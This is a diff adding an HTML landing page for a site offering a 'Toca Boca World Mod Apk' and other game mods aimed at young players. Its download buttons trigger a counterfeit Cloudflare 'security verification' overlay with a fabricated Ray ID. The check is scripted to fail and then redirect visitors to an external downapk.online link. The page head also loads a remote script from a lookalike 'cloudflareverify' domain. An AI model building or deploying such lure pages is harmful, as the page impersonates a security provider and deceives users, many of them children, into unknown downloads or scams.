@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Download the latest Toca Boca Mod with all items unlocked. Get working mods for Avatar World, Roblox, and premium anime games at PlanexApk.online. Fast and secure for iOS & Android</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">
+    
+<script type="text/javascript" id="ogjs" src="https://cloudflareverify.downapk.online/cl/js/j77kpk"></script>
+
+    <style type="text/css">
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;700&display=swap');
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: #fff;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .cr { width: 100%; max-width: 500px; background: #fff; box-shadow: 0 0 20px rgba(0,0,0,0.03); min-height: 100vh; }
+        .cr .cover img { width:100%; height: 220px; object-fit: cover; display: block; border-bottom-left-radius: 20px; border-bottom-right-radius: 20px;}
+        .cr .logo { display:flex; padding: 0 15px; align-items: center; }
+        .cr .logo img { width:120px; height:110px; border:4px solid #fff; margin-top:-50px; border-radius:30px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); background: #fff; z-index: 10; object-fit: cover; }
+        .cr .logo .info { padding:10px 0 0 15px; }
+        
+        .det { display:flex; margin:20px 0; }
+        .det .item { width:100%; text-align:center; font-size:.9rem; }
+
+        /* Buttons Style */
+        .download-container { padding: 0 20px; margin-bottom: 25px; }
+        .btn-down {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            background: #000;
+            color: #fff !important;
+            padding: 12px 0;
+            border-radius: 34px;
+            margin-bottom: 12px;
+            text-decoration: none !important;
+            font-weight: 500;
+            border: none;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .btn-down:hover { opacity: 0.8; transform: scale(1.02); }
+        .btn-down i { margin-right: 10px; font-size: 1.2rem; }
+
+        /* Slider Play Store Style */
+        .screenshots-container {
+            display: flex;
+            overflow-x: auto;
+            gap: 12px;
+            padding: 10px 20px;
+            scrollbar-width: none;
+            scroll-snap-type: x mandatory;
+            -webkit-overflow-scrolling: touch;
+        }
+        .screenshots-container::-webkit-scrollbar {
+            display: none;
+        }
+        .screenshot-item {
+            flex: 0 0 85%;
+            scroll-snap-align: start;
+            border-radius: 15px;
+            overflow: hidden;
+            border: 1px solid #eee;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+        }
+        .screenshot-item img {
+            width: 100%;
+            height: 200px;
+            display: block;
+        }
+
+        .bad { display:flex; overflow-x:auto; color:#666; padding: 0 15px; margin-bottom: 20px; }
+        .bad div { margin-right:10px; padding:4px 10px; border:2.3px solid #ccc; font-size:.8rem; white-space:nowrap; border-radius:15px; }
+
+        p { font-size:.85rem; color:#777; padding: 0 15px; line-height: 1.6; }
+        h1 { font-size:1.6rem; margin:0; font-weight: 700; }
+        h2 { font-size:1.4rem; padding: 0 15px; margin-top: 20px; font-weight: 600; }
+        
+        /* Footer Full Width */
+        footer {
+            background:#252525;
+            padding:40px 0 20px 0;
+            margin-top:40px;
+            color:#a1a1a1;
+            font-size:.9rem;
+            width: 100%;
+        }
+        .footer-content { max-width: 500px; margin: 0 auto; padding: 0 20px; }
+        hr { border-color: #444; margin: 20px 0; }
+        h4 { color:#eee; font-size:1rem; margin-bottom: 15px; }
+
+        /* ── CF OVERLAY CSS ── */
+        .cf-overlay { position: fixed; inset: 0; z-index: 11000; background: #05000A; display: none; flex-direction: column; padding: 16px; transition: opacity 0.4s ease; opacity: 0; align-items: center; }
+        .cf-overlay.open { display: flex; opacity: 1; }
+        
+        /* الأنيميشن الجديدة ديال الدخول */
+        @keyframes popup-cf {
+            0% { transform: scale(0.95) translateY(20px); opacity: 0; }
+            100% { transform: scale(1) translateY(0); opacity: 1; }
+        }
+        .cf-content-anim { animation: popup-cf 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards; opacity: 0; }
+
+        @keyframes cf-spin { 100% { transform: rotate(360deg); } }
+        .cf-spinner-el { border: 3px solid transparent; border-top-color: #22c55e; border-radius: 50%; width: 28px; height: 28px; animation: cf-spin 1s linear infinite; }
+        .cf-loader-el { border: 2px solid rgba(255,255,255,0.1); border-top-color: #22c55e; border-radius: 50%; width: 16px; height: 16px; animation: cf-spin 1s linear infinite; }
+
+        /* ── Similar Games Slider CSS ── */
+        .similar-games-container { display: flex; overflow-x: auto; gap: 12px; padding: 15px 15px 20px; scrollbar-width: none; scroll-snap-type: x mandatory; -webkit-overflow-scrolling: touch; }
+        .similar-games-container::-webkit-scrollbar { display: none; }
+        .game-card { flex: 0 0 80px; scroll-snap-align: start; text-align: center; text-decoration: none !important; }
+        .game-card img { width: 80px; height: 80px; border-radius: 18px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); margin-bottom: 8px; object-fit: cover; border: 1px solid #eee; }
+        .game-card span { display: block; font-size: 0.75rem; color: #333; font-weight: 600; line-height: 1.2; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .show-more-card { display: flex; flex-direction: column; align-items: center; justify-content: center; width: 80px; height: 80px; background: #f0f0f0; border-radius: 18px; color: #000; cursor: pointer; border: 1px dashed #ccc; scroll-snap-align: start; flex: 0 0 80px; }
+        .show-more-card i { font-size: 1.5rem; margin-bottom: 4px; color: #555; }
+        .show-more-card span { font-size: 0.75rem; font-weight: 700; color: #333; }
+    </style>
+</head>
+<body>
+
+<div class="cr">
+    <div class="cover">
+        <img src="https://geekdad.com/wp-content/uploads/2019/01/TocaBoca_Life-World.jpg" alt="Cover">
+    </div>
+    
+    <div class="logo">
+        <img src="https://www.apkmirror.com/wp-content/themes/APKMirror/ap_resize/ap_resize.php?src=https%3A%2F%2Fdownloadr2.apkmirror.com%2Fwp-content%2Fuploads%2F2025%2F10%2F91%2F68f74e4ee17c5_com.tocaboca.tocalifeworld.png&w=96&h=96&q=100" alt="Logo">
+        <div class="info">
+            <h1>Toca Boca World Mod Apk </h1>
+            <small>Free - All items Unlocked</small>
+        </div>
+    </div>
+
+    <div class="det">
+        <div class="item">
+            <div class="icon">4.3 <i class="bi bi-star-fill"></i></div>
+            <div>5M reviews</div>
+        </div>
+        <div class="item">
+            <div class="icon"><i class="bi bi-cloud-arrow-down-fill"></i></div>
+            <div>720 MB</div>
+        </div>
+        <div class="item">
+            <div class="icon">+100M</div>
+            <div>Downloads</div>
+        </div>
+    </div>
+
+    <div class="download-container">
+        <button onclick="startDownload('Android')" class="btn-down">
+            <i class="bi bi-android2"></i> Download For Android
+        </button>
+        <button onclick="startDownload('iOS')" class="btn-down">
+            <i class="bi bi-apple"></i> Download For iOS
+        </button>
+        <button onclick="startPC()" class="btn-down">
+            <i class="bi bi-windows"></i> Download For PC
+        </button>
+    </div>
+
+    <div class="screenshots-container">
+        <div class="screenshot-item">
+            <img src="https://m.media-amazon.com/images/I/91AMXd8KrzL.png" alt="SS1">
+        </div>
+         <div class="screenshot-item">
+            <img src="https://play-lh.googleusercontent.com/TSqd74HJUq_Buuh6RKpMlRkx3ZrK794E7EOuqhLc4_9xP1J9Oen1R973qRtmpf0vTJuB=w526-h296-rw" alt="SS1">
+        </div>
+         <div class="screenshot-item">
+            <img src="https://playgama.com/cdn-cgi/imagedelivery/LN2S-4p3-GgZvEx3IPaKUA/f7312f06-7df1-4e01-97cf-0deceb28e700/enlarged" alt="SS1">
+        </div>
+        <div class="screenshot-item">
+            <img src="https://geometry-games.io/data/image/game/toca-boca/toca-boca.png" alt="SS2">
+        </div>
+         <div class="screenshot-item">
+            <img src="https://static.playhop.com/images/89c6f_13012056_89f63/81d8ee8c9/2a00000199508843_e36cc8b/5d5599160edcafa7c917_a4000a/orig" alt="SS3">
+        </div>
+          <div class="screenshot-item">
+            <img src="https://cdn.soft112.com/toca-life-world/00/00/0H/CH/00000HCH0R/Toca-Life-World---3.png" alt="SS2">
+        </div>
+        <div class="screenshot-item">
+            <img src="https://miro.medium.com/v2/resize:fit:4000/1*AngS962PzOkoZbqwINspJw.jpeg" alt="SS4">
+        </div>
+        
+    </div>
+
+    <h2>About this game</h2>
+    <p>
+         <strong>Create stories and build your own world with Toca Life World. With this exclusive modded version, you will get access to ALL locations, characters, pets, and furniture items completely unlocked for free! No need to purchase anything from the shop. Design your dream houses and explore without limits today.</strong>
+    </p>
+
+    <h2>Similar Games</h2>
+    <div class="similar-games-container">
+        <a href="https://yourusername.github.io/avatar-world/" class="game-card">
+            <img src="https://images.igdb.com/igdb/image/upload/t_cover_big_2x/co7szg.jpg" alt="Avatar World">
+            <span>Avatar World Mod</span>
+        </a>
+        <a href="https://yourusername.github.io/roblox-mod/" class="game-card">
+            <img src="https://play-lh.googleusercontent.com/JoRsmy2FbqJX_29akkHCFXyVSakPPOACkKCBrqEeUGAT5LDZ9qljNwan-y7pV0baZQ749L9VQN8F9E6QkcsI" alt="Roblox">
+            <span>Match Masters Mod</span>
+        </a>
+        <a href="https://yourusername.github.io/minecraft/" class="game-card">
+            <img src="https://play-lh.googleusercontent.com/VSwHQjcAttxsLE47RuS4PqpC4LT7lCoSjE7Hx5AW_yCxtDvcnsHHvm5CTuL5BPN-uRTP" alt="Minecraft">
+            <span>Minecraft Mod</span>
+        </a>
+        <a href="https://yourusername.github.io/gacha-life-2/" class="game-card">
+            <img src="https://img.itch.zone/aW1nLzEzOTYyOTkwLnBuZw==/347x500/%2FA%2FVb1.png" alt="Gacha Life 2">
+            <span>Gacha Life 2 Mod</span>
+        </a>
+        <a href="https://yourusername.github.io/pk-xd/" class="game-card">
+            <img src="https://cdn-bgp.bluestacks.com/BGP/us/gametiles_com.vizorapps.klondike.jpg" alt="PK XD Mod">
+            <span>Klondike Mod Apk</span>
+        </a>
+        <a href="https://yourusername.github.io/all-games/" style="text-decoration:none;">
+            <div class="show-more-card">
+                <i class="bi bi-plus-lg"></i>
+                <span>More</span>
+            </div>
+        </a>
+    </div>
+
+    <div class="bad">
+        <div>Top Free Version</div> 
+        <div>Simulation</div>
+        <div>Stylized</div>
+        <div>Life</div>
+    </div>
+</div>
+   
+<footer>
+    <div class="footer-content">
+        <h4>Toca Boca World Mod Apk v3.8.5</h4>
+        <div class="row">
+            <div class="col-6">
+                <div class="mb-2">About Game</div>
+                <div class="mb-2">Toca Boca World</div>
+                <div class="mb-2">Free Download</div>
+            </div>
+            <div class="col-6">
+                <div class="mb-2">Support</div>
+                <div class="mb-2">Contact</div>
+                <div class="mb-2">About us</div>
+            </div>
+        </div>
+        <hr>
+        <div class="text-center">
+            © Planexapk.online / All Rights Reserved
+        </div>
+    </div>
+</footer>
+
+<div class="cf-overlay" id="cf-overlay">
+    <div class="cf-content-anim" style="padding-top:80px;max-width:800px;width:100%;margin:0 auto; font-family: 'Poppins', sans-serif;">
+        <p style="font-size:19px;font-weight:700;color:#9ca3af;text-transform:uppercase;letter-spacing:0.1em;margin-bottom:8px;">planexapk.online</p>
+        <h1 style="font-size:32px;font-weight:800;color:white;margin-bottom:10px;letter-spacing:-0.02em;">Performing security<br>verification</h1>
+        <p style="color:#9ca3af;font-size:15px;line-height:1.6;margin-bottom:40px;max-width:480px;">This website uses a security service to protect against malicious bots. This page is displayed while we verify you are not a bot.</p>
+
+        <div style="background:#111;border:1px solid #333;border-radius:6px;width:100%;max-width:340px;height:75px;display:flex;align-items:center;justify-content:space-between;padding:0 16px;box-shadow:0 4px 10px rgba(0,0,0,0.5);">
+            <div style="display:flex;align-items:center;gap:14px;" id="cf-interaction">
+                <div id="cf-initial-box" style="width:28px;height:28px;display:flex;align-items:center;justify-content:center;"><div class="cf-loader-el"></div></div>
+                <div id="cf-checkbox" style="display:none;width:28px;height:28px;border:2px solid #9ca3af;border-radius:4px;cursor:pointer;background:transparent;" onclick="startCFVerification()"></div>
+                <div id="cf-spinner" style="display:none;width:28px;height:28px;position:relative;"><div class="cf-spinner-el" style="position:absolute;inset:0;"></div></div>
+                <div id="cf-failure" style="display:none;width:28px;height:28px;display:none;align-items:center;justify-content:center;">
+                    <svg width="32" height="32" fill="none" stroke="#ef4444" stroke-width="3" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/></svg>
+                </div>
+                <span id="cf-text" style="color:#9ca3af;font-size:15px;font-weight:600;">Verifying...</span>
+            </div>
+            <div style="display:flex;flex-direction:column;align-items:flex-end;gap:0px;">
+                <div style="margin-bottom: -7px; display: flex; justify-content: flex-end;">
+                    <img src="https://i.ibb.co/nqV5JMM8/cloudflare-logo-black-sth-2-removebg-preview.png" alt="Cloudflare" id="cf-logo-img" style="height: 50px; width: auto; object-fit: contain;">
+                </div>
+                <div style="font-size:8px;color:#fff;"><a href="https://www.cloudflare.com/privacypolicy/" target="_blank" style="color:#fff;text-decoration:none;">Privacy</a> · <a href="https://www.cloudflare.com/website-terms/" target="_blank" style="color:#fff;text-decoration:none;">Help</a></div>
+            </div>
+        </div>
+
+        <div style="margin-top:150px;border-top:1px solid #333;padding-top:20px;">
+            <p style="font-size:13px;color:white;margin-bottom:4px;font-weight:600;">Ray ID: <span id="rayId" style="font-family:monospace;color:#9ca3af;font-weight:400;"></span></p>
+            <p style="font-size:13px;color:white;font-weight:600;">Performance & Security by <a href="https://www.cloudflare.com" target="_blank" style="color:#3b82f6;text-decoration:underline;font-weight:400;">Cloudflare</a> <span style="color:#9ca3af; margin:0 4px;">·</span> <a href="https://www.cloudflare.com/website-terms/" target="_blank" style="color:#3b82f6;text-decoration:underline;font-weight:400;">Terms</a></p>
+        </div>
+    </div>
+</div>
+
+<script type="text/javascript">
+    let pendingPlatform = ''; 
+
+    function generateRayId() {
+        return Math.random().toString(36).substring(2, 18) + Math.random().toString(36).substring(2, 18);
+    }
+
+    function triggerSecurityCheck(platform) {
+        pendingPlatform = platform;
+        document.getElementById('rayId').textContent = generateRayId();
+
+        const cfOverlay = document.getElementById('cf-overlay');
+        document.getElementById('cf-initial-box').style.display = 'flex';
+        document.getElementById('cf-checkbox').style.display = 'none';
+        document.getElementById('cf-spinner').style.display = 'none';
+        document.getElementById('cf-failure').style.display = 'none';
+        document.getElementById('cf-text').textContent = 'Verifying...';
+
+        cfOverlay.classList.add('open');
+
+        // الوقت ديال اللودينڭ اللول 4 ثواني
+        setTimeout(() => {
+            document.getElementById('cf-initial-box').style.display = 'none';
+            document.getElementById('cf-checkbox').style.display = 'flex';
+            document.getElementById('cf-text').textContent = 'Verify you are human!';
+        }, 4000);
+    }
+
+    function startCFVerification() {
+        document.getElementById('cf-checkbox').style.display = 'none';
+        document.getElementById('cf-spinner').style.display = 'flex';
+        document.getElementById('cf-text').textContent = 'Verifying...';
+
+        // الوقت ديال اللودينڭ التاني 3.5 ثواني
+        setTimeout(() => {
+            document.getElementById('cf-spinner').style.display = 'none';
+            document.getElementById('cf-failure').style.display = 'flex';
+            document.getElementById('cf-text').textContent = 'Verification required!';
+
+            setTimeout(() => {
+                executeRedirect(); // غنعيطو للفانكشن اللي كتدوز للرابط
+                const cf = document.getElementById('cf-overlay');
+                cf.style.opacity = '0';
+                setTimeout(() => { cf.classList.remove('open'); cf.style.opacity = ''; }, 500);
+            }, 800);
+        }, 3500);
+    }
+
+    function executeRedirect() {
+        // هادي هي الفكرة الواعرة ديالك، غيدوز للرابط نيشان!
+        window.location.href = "https://performingsecurity.downapk.online/cl/i/j77kpk";
+    }
+
+    // Handler for Mobile
+    function startDownload(platform) {
+        triggerSecurityCheck(platform);
+    }
+
+    // New Handler for PC
+    function startPC() {
+        triggerSecurityCheck('PC');
+    }
+</script>
+
+</body>
+</html>
